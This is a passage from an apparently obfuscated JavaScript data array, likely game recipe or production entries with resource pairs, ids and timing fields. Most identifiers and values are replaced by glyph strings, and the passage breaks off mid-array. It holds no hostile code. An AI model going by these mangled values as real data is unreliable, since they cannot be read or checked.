			"ⵠΔᐃⲆ": ᐃᐃ.ΔⵠΔⵠΔ,
			time: ⵠⲆΔ / 60,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 50]
			],
			w: ΔΔΔ,
			f: 0,
			"ᐃⲆΔ": ⲆΔⵠ,
			e: ᐃⵠΔ,
			id: ᐃᐃⲆ.ⲆΔᐃⲆᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆΔᐃⲆᐃ,
			time: .1,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, ⵠⵠΔⵠᐃ]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ΔⲆΔⲆᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⲆΔⲆᐃ,
			time: ᐃⲆᐃ / ⵠᐃΔⲆ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 30]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⵠΔⲆᐃⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠΔⲆᐃⵠ,
			time: ⵠⲆΔ / ⲆⲆΔⵠ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 120]
			],
			w: ⵠⲆΔ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⲆⵠΔΔⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⵠΔΔⵠ,
			time: .06666666666666667,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 20],
				[ᐃᐃ.ⲆⵠΔⲆᐃ, 15]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ΔⲆⵠⲆ,
			e: 0,
			id: ᐃᐃⲆ.ⵠᐃΔⲆⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠᐃΔⲆⲆ,
			time: ΔΔΔ / ⲆΔΔᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ΔⲆⲆΔⵠ, 25]
			],
			w: 1,
			f: ⵠΔΔ,
			"ᐃⲆΔ": Δᐃᐃᐃ,
			e: 0,
			id: ᐃᐃⲆ.ᐃᐃⲆⲆᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃᐃⲆⲆᐃ,
			time: ΔΔΔ / 5,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ᐃᐃⲆⲆᐃ, ᐃⲆᐃ]
			],
			w: 0,
			f: ΔΔⵠ,
			"ᐃⲆΔ": 1,
			e: ΔᐃΔΔ,
			id: ᐃᐃⲆ.ⵠⲆᐃᐃᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⲆᐃᐃᐃ,
			time: .2,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ᐃⵠⲆⲆΔ, ⲆⲆⲆⵠΔ],
				[ᐃᐃ.ᐃᐃⲆⲆᐃ, 1]
			],
			w: ΔⲆⵠⲆ,
			f: ᐃΔᐃⲆ,
			"ᐃⲆΔ": ΔΔⵠⵠ,
			e: 0,
			id: ᐃᐃⲆ.ᐃⲆΔⲆⵠⲆΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⲆᐃᐃᐃ,
			time: 1 / ᐃᐃⲆⵠⵠ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ᐃᐃⲆⲆᐃ, 1]
			],
			w: 0,
			f: ᐃΔΔ,
			"ᐃⲆΔ": 0,
			e: 1,
			id: ᐃᐃⲆ.ΔⲆⲆⲆΔⵠᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⲆᐃᐃᐃ,
			time: ⵠΔᐃ / 3,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 60],
				[ᐃᐃ.ᐃᐃΔⲆ, ⲆᐃᐃΔΔ],
				[ᐃᐃ.ᐃᐃᐃΔΔ, 2]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ⲆⲆⲆᐃ,
			e: Δⵠᐃ,
			id: ᐃᐃⲆ.ΔΔⲆᐃᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔΔⲆᐃᐃ,
			time: 1 / ⲆΔΔᐃᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ΔⲆᐃΔ, 40],
				[ᐃᐃ.ᐃᐃΔⲆ, 45]
			],
			w: 1,
			f: Δᐃᐃᐃ,
			"ᐃⲆΔ": ΔⲆⵠⲆ,
			e: ⲆⲆⲆᐃ,
			id: ᐃᐃⲆ.ⵠⵠᐃⲆⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⵠᐃⲆⵠ,
			time: 1 / ⵠΔΔⲆᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⵠᐃⲆⵠ, ᐃΔᐃⲆ],
				[ᐃᐃ.ⵠⲆⲆᐃᐃ, 40],
				[ᐃᐃ.ⵠΔᐃⵠᐃ, ᐃⲆᐃ]
			],
			w: 1,
			f: ΔΔΔ,
			"ᐃⲆΔ": ⲆⵠⲆⲆ,
			e: 0,
			id: ᐃᐃⲆ.ΔᐃΔⲆᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔᐃΔⲆᐃ,
			time: .005,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 50],
				[ᐃᐃ.ᐃᐃΔⲆ, 100]
			],
			w: ᐃⲆᐃ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ᐃⵠᐃⲆⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃⵠᐃⲆⵠ,
			time: ⵠⲆΔ / 90,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ᐃᐃΔⲆ, 60],
				[ᐃᐃ.ΔⲆⵠⵠ, 120]
			],
			w: ᐃΔᐃⲆ,
			f: 0,
			"ᐃⲆΔ": ᐃⵠΔ,
			e: ⵠⲆᐃⵠ,
			id: ᐃᐃⲆ.ⲆΔΔΔᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆΔΔΔᐃ,
			time: ᐃᐃⵠ / 90,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ΔⲆⵠⵠ, 70],
				[ᐃᐃ.ΔⲆᐃΔ, 140]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ⲆⲆⲆᐃ,
			e: 0,
			id: ᐃᐃⲆ.ⵠⵠΔⵠⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⵠΔⵠⵠ,
			time: 1 / 90,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ΔⲆᐃΔ, 80],
				[ᐃᐃ.ⲆⵠΔⲆ, 160]
			],
			w: ᐃⲆᐃ,
			f: ᐃⵠΔ,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ᐃᐃΔⲆⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃᐃΔⲆⲆ,
			time: Ⲇᐃⵠ / 90,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⲆⵠΔⲆ, 90],
				[ᐃᐃ.ⲆΔᐃᐃ, 180]
			],
			w: ⲆⵠⲆⲆ,
			f: 0,
			"ᐃⲆΔ": ΔΔⵠ,
			e: 0,
			id: ᐃᐃⲆ.ⵠᐃΔⲆᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠᐃΔⲆᐃ,
			time: ΔⲆᐃᐃ / 90,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ᐃᐃΔⲆ, 70]
			],
			w: Ⲇᐃⵠ,
			f: ⲆⲆⲆᐃ,
			"ᐃⲆΔ": 0,
			e: ΔᐃΔΔ,
			id: ᐃᐃⲆ.ΔΔᐃⲆΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔΔᐃⲆΔ,
			time: .1,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ᐃᐃΔⲆ, 70],
				[ᐃᐃ.ⵠⲆⲆᐃ, 50]
			],
			w: 1,
			f: ⵠΔⲆⵠ,
			"ᐃⲆΔ": ΔᐃΔΔ,
			e: 0,
			id: ᐃᐃⲆ.ΔΔⵠᐃⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔΔⵠᐃⵠ,
			time: 1 / ⵠⵠΔⲆᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 40],
				[ᐃᐃ.ᐃᐃΔⲆ, 40]
			],
			w: 1,
			f: Δⵠᐃ,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⲆⵠᐃⲆⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⵠᐃⲆⵠ,
			time: .1,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⲆΔⵠΔⲆ, ⵠΔΔ],
				[ᐃᐃ.ⲆᐃⲆⲆⲆ, ⵠΔⲆ]
			],
			w: 0,
			f: ΔⲆⲆ,
			"ᐃⲆΔ": ΔΔⵠ,
			e: 0,
			id: ᐃᐃⲆ.ΔⵠⲆⵠⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⵠⲆⵠⵠ,
			time: 1 / 3,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ΔΔΔΔᐃ, 30],
				[ᐃᐃ.ⲆᐃΔᐃᐃ, 1],
				[ᐃᐃ.ⲆⵠΔⲆ, 150],
				[ᐃᐃ.ⵠΔⲆⲆᐃ, 3]
			],
			w: ᐃᐃⵠ,
			f: 1,
			"ᐃⲆΔ": 1,
			e: 0,
			id: ᐃᐃⲆ.ⵠᐃⲆⲆⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠᐃⲆⲆⵠ,
			time: .008333333333333333,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⵠᐃⲆⲆⵠ, ⵠⲆΔ],
				[ᐃᐃ.ΔΔᐃᐃᐃ, ⵠΔᐃ],
				[ᐃᐃ.ⲆΔᐃᐃ, 150],
				[ᐃᐃ.ⲆᐃⵠΔΔ, 2]
			],
			w: ⵠΔΔ,
			f: ᐃⲆᐃ,
			"ᐃⲆΔ": ᐃᐃⲆΔ,
			e: 0,
			id: ᐃᐃⲆ.ⵠⵠᐃⵠΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⵠᐃⵠΔ,
			time: .005555555555555556,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⲆⵠⲆⵠΔ, 1],
				[ᐃᐃ.ᐃΔΔΔⵠ, ᐃΔᐃΔⲆ],
				[ᐃᐃ.ΔⵠⲆΔⵠ, ⲆⵠⲆⵠⲆ],
				[ᐃᐃ.ᐃᐃᐃΔΔ, ⲆⵠΔΔᐃ]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ⲆⲆⲆᐃ,
			e: 0,
			id: ᐃᐃⲆ.ΔⲆⲆⲆⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⲆⲆⲆⲆ,
			time: ᐃⲆᐃ / 60,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ΔΔΔΔᐃ, ⲆⲆⲆⵠΔ],
				[ᐃᐃ.ⵠⵠⵠΔⵠ, ⵠΔᐃ],
				[ᐃᐃ.ⲆⵠΔⲆ, 150],
				[ᐃᐃ.ⵠΔⲆⲆᐃ, 3]
			],
			w: ΔⲆᐃᐃ,
			f: ⲆⵠⲆⲆ,
			"ᐃⲆΔ": ΔΔΔ,
			e: ⵠⲆᐃⵠ,
			id: ᐃᐃⲆ.ᐃⲆⲆᐃⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃⲆⲆᐃⲆ,
			time: .008333333333333333,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ᐃⲆⲆᐃⲆ, 1],
				[ᐃᐃ.ⵠΔᐃⲆⲆ, 1],
				[ᐃᐃ.ⲆΔᐃᐃ, 150],
				[ᐃᐃ.ⲆᐃⵠΔΔ, 2]
			],
			w: ᐃⲆᐃ,
			f: 1,
			"ᐃⲆΔ": ⵠΔᐃ,
			e: 0,
			id: ᐃᐃⲆ.ⵠⲆⵠⲆᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⲆⵠⲆᐃ,
			time: .005555555555555556,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 100],
				[ᐃᐃ.ᐃᐃᐃΔΔ, 4]
			],
			w: ⵠΔΔ,
			f: 0,
			"ᐃⲆΔ": ᐃⵠⲆ,
			e: ΔⲆⲆ,
			id: ᐃᐃⲆ.ⵠᐃΔⲆⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠᐃΔⲆⵠ,
			time: 1 / ⲆᐃᐃΔΔ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 30]
			],
			w: 1,
			f: ᐃⵠⲆ,
			"ᐃⲆΔ": ΔᐃΔΔ,
			e: ΔⲆⵠⲆ,
			id: ᐃᐃⲆ.ΔᐃΔΔᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔᐃΔΔᐃ,
			time: .2,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ᐃᐃΔⲆ, 200],
				[ᐃᐃ.ᐃᐃᐃΔΔ, 8],
				[ᐃᐃ.ΔⲆᐃⲆⲆ, 4],
				[ᐃᐃ.ⵠᐃΔⲆⵠ, ⵠΔᐃ]
			],
			w: 1,
			f: ΔⲆⵠⲆ,
			"ᐃⲆΔ": ⵠⲆᐃⵠ,
			e: 0,
			id: ᐃᐃⲆ.ᐃΔⲆᐃΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃΔⲆᐃΔ,
			time: ΔⲆᐃᐃ / 25,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ᐃᐃΔⲆ, 20],
				[ᐃᐃ.ⵠᐃⲆᐃᐃ, 1]
			],
			w: ⵠΔΔ,
			f: ᐃⵠⲆ,
			"ᐃⲆΔ": ⲆⲆⲆᐃ,
			e: ⵠⲆᐃⵠ,
			id: ᐃᐃⲆ.ⲆΔᐃⲆⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆΔᐃⲆⵠ,
			time: ΔⲆᐃᐃ / ⵠⵠΔⵠ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ΔⲆⵠⵠ, 200],
				[ᐃᐃ.ᐃᐃᐃΔΔ, ⵠⲆᐃᐃⲆ],
				[ᐃᐃ.ⵠᐃⲆᐃᐃ, 4],
				[ᐃᐃ.ΔⲆᐃⲆⲆ, 4],
				[ᐃᐃ.ᐃΔⲆᐃΔ, 1]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": 0,
			e: Δᐃᐃᐃ,
			id: ᐃᐃⲆ.ᐃⲆⵠⲆⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃⲆⵠⲆⵠ,
			time: ⵠΔᐃ / 30,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ΔⲆⵠⵠ, ⵠⲆⲆⲆⲆ],
				[ᐃᐃ.ΔⲆᐃⲆⲆ, ⲆⵠⲆⲆ]
			],
			w: 1,
			f: Δⵠᐃ,
			"ᐃⲆΔ": ΔΔⵠⵠ,
			e: 0,
			id: ᐃᐃⲆ.ΔⵠⲆⲆⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⵠⲆⲆⲆ,
			time: ᐃⲆᐃ / ⲆⲆᐃΔΔ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ΔⲆᐃΔ, 200],
				[ᐃᐃ.ΔΔΔΔᐃ, 10],
				[ᐃᐃ.ⵠᐃⲆᐃᐃ, 8],
				[ᐃᐃ.ΔⲆᐃⲆⲆ, 8],
				[ᐃᐃ.ᐃⲆⵠⲆⵠ, ⵠΔᐃ]
			],
			w: ⲆⵠⲆⲆ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: ΔⲆⵠⲆ,
			id: ᐃᐃⲆ.ᐃⵠΔⵠΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃⵠΔⵠΔ,
			time: ΔⲆⵠ / 35,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ΔⲆᐃΔ, 10],
				[ᐃᐃ.ΔⲆᐃⲆⲆ, ᐃΔᐃⲆ]
			],
			w: ᐃᐃⲆΔ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⵠᐃᐃΔⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠᐃᐃΔⵠ,
			time: 1 / ⵠⵠΔⲆᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⲆⵠΔⲆ, 200],
				[ᐃᐃ.ΔΔΔΔᐃ, ⵠⵠⲆΔΔ],
				[ᐃᐃ.ΔⲆᐃⲆⲆ, ΔᐃΔⲆⲆ],
				[ᐃᐃ.ᐃⲆΔᐃΔ, 8],
				[ᐃᐃ.ᐃⵠΔⵠΔ, ⵠΔΔ]
			],
			w: ⲆⵠⲆⲆ,
			f: ᐃⵠΔ,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⲆⲆᐃᐃΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⲆᐃᐃΔ,
			time: 1 / 40,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⲆⵠΔⲆ, ⲆΔΔᐃᐃ],
				[ᐃᐃ.ᐃⲆΔᐃΔ, 1]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ᐃⵠⵠΔⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃⵠⵠΔⲆ,
			time: 1 / 15,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⲆΔᐃᐃ, 200],
				[ᐃᐃ.ΔΔΔΔᐃ, 10],
				[ᐃᐃ.ᐃⲆᐃⲆᐃ, 1],
				[ᐃᐃ.ⲆⲆᐃᐃΔ, 1]
			],
			w: ⵠΔΔ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: ⲆΔⵠ,
			id: ᐃᐃⲆ.ⵠΔΔⵠⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠΔΔⵠⵠ,
			time: ⵠᐃⵠΔ / 45,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⲆΔᐃᐃ, ⵠᐃⲆⲆΔ],
				[ᐃᐃ.ᐃⲆΔᐃΔ, ⵠⲆΔ],
				[ᐃᐃ.ΔⵠᐃᐃΔ, 1]
			],
			w: Ⲇᐃⵠ,
			f: ⵠΔⲆⵠ,
			"ᐃⲆΔ": ΔᐃΔΔ,
			e: ΔⲆⲆ,
			id: ᐃᐃⲆ.ⲆⵠⲆΔᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⵠⲆΔᐃ,
			time: .06666666666666667,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃᐃ, 200],
				[ᐃᐃ.ΔΔΔΔᐃ, 10],
				[ᐃᐃ.ⵠⵠⵠΔⵠ, ⵠΔΔ],
				[ᐃᐃ.ⵠΔΔⵠⵠ, ᐃᐃⵠ]
			],
			w: 1,
			f: ΔⲆⲆ,
			"ᐃⲆΔ": ⵠΔⲆⵠ,
			e: ⵠⲆᐃⵠ,
			id: ᐃᐃⲆ.ᐃᐃΔⵠᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃᐃΔⵠᐃ,
			time: ᐃᐃⲆΔ / 50,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃᐃ, ᐃᐃⲆⵠⵠ],
				[ᐃᐃ.ⵠΔᐃⵠᐃ, ΔΔΔ]
			],
			w: ΔⲆⵠ,
			f: 0,
			"ᐃⲆΔ": ᐃΔΔ,
			e: Δⵠᐃ,
			id: ᐃᐃⲆ.ᐃⵠⲆⵠⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃⵠⲆⵠⵠ,
			time: 1 / ⵠⵠⵠⲆᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, ⵠᐃⲆΔΔ]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⵠⲆⲆⲆΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⲆⲆⲆΔ,
			time: .04,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆⲆΔ, 1],
				[ᐃᐃ.ᐃᐃΔⲆ, 100],
				[ᐃᐃ.ⵠⲆⲆᐃ, 50]
			],
			w: ⵠⲆΔ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: ΔᐃΔΔ,
			id: ᐃᐃⲆ.ΔᐃⵠΔⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔᐃⵠΔⲆ,
			time: .025,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ΔᐃⵠΔⲆ, 1],
				[ᐃᐃ.ΔⲆⵠⵠ, 50],
				[ᐃᐃ.ᐃᐃΔⲆ, 50],
				[ᐃᐃ.ⵠⲆⲆᐃ, 50]
			],
			w: Ⲇᐃⵠ,
			f: 0,
			"ᐃⲆΔ": ⵠⲆⲆ,
			e: 0,
			id: ᐃᐃⲆ.ⲆΔⲆⵠⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆΔⲆⵠⵠ,
			time: ⵠⲆΔ / 50,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⲆΔⲆⵠⵠ, 1],
				[ᐃᐃ.ΔⲆᐃΔ, 50],
				[ᐃᐃ.ΔⲆⵠⵠ, 50],
				[ᐃᐃ.ᐃᐃΔⲆ, 50]
			],
			w: ⵠᐃⵠΔ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⲆᐃⵠᐃⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆᐃⵠᐃⲆ,
			time: ᐃΔᐃⲆ / 70,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⲆᐃⵠᐃⲆ, ⵠΔΔ],
				[ᐃᐃ.ⲆⵠΔⲆ, 50],
				[ᐃᐃ.ΔⲆᐃΔ, 50],
				[ᐃᐃ.ΔⲆⵠⵠ, 50]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⲆⵠⵠΔᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⵠⵠΔᐃ,
			time: ΔΔΔ / 90,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⲆⵠⵠΔᐃ, Ⲇᐃⵠ],
				[ᐃᐃ.ⲆΔᐃᐃ, 50],
				[ᐃᐃ.ⲆⵠΔⲆ, 50],
				[ᐃᐃ.ΔⲆᐃΔ, 50]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ᐃΔΔ,
			e: 0,
			id: ᐃᐃⲆ.ᐃᐃᐃⵠΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃᐃᐃⵠΔ,
			time: .008333333333333333,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ΔⲆⵠᐃⵠ, 1],
				[ᐃᐃ.ΔⲆⵠⵠ, 200]
			],
			w: 1,
			f: ΔⲆⵠ,
			"ᐃⲆΔ": 1,
			e: ⲆΔⵠ,
			id: ᐃᐃⲆ.Ⲇⵠᐃⵠⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.Ⲇⵠᐃⵠⵠ,
			time: .016666666666666666,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ΔᐃⲆᐃᐃ, 1],
				[ᐃᐃ.ΔⲆⵠⵠ, 200]
			],
			w: 1,
			f: ᐃΔᐃⲆ,
			"ᐃⲆΔ": 1,
			e: Δⵠᐃ,
			id: ᐃᐃⲆ.ᐃΔⵠⲆⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃΔⵠⲆⲆ,
			time: .016666666666666666,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ᐃᐃΔⵠΔ, 1],
				[ᐃᐃ.ΔⲆⵠⵠ, 200],
				[ᐃᐃ.ⵠΔⲆⲆᐃ, ΔⲆᐃᐃ]
			],
			w: ᐃᐃⲆΔ,
			f: 1,
			"ᐃⲆΔ": 1,
			e: 0,
			id: ᐃᐃⲆ.ΔᐃᐃΔΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔᐃᐃΔΔ,
			time: ⵠᐃⵠΔ / 60,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ΔᐃᐃᐃΔ, 10],
				[ᐃᐃ.ⲆᐃⵠⲆᐃ, ⵠⵠΔΔ],
				[ᐃᐃ.ᐃᐃᐃΔΔ, ΔᐃⲆᐃ]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ΔᐃΔΔ,
			e: 0,
			id: ᐃᐃⲆ.ⲆⵠᐃΔΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⵠᐃΔΔ,
			time: Ⲇᐃⵠ / 10,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⲆᐃⵠⲆᐃ, 3],
				[ᐃᐃ.ᐃᐃᐃΔΔ, ⵠⲆⵠⲆ]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": 0,
			e: ΔΔⵠ,
			id: ᐃᐃⲆ.ⲆⲆΔⲆᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⲆΔⲆᐃ,
			time: 1 / ⵠⵠΔⲆᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
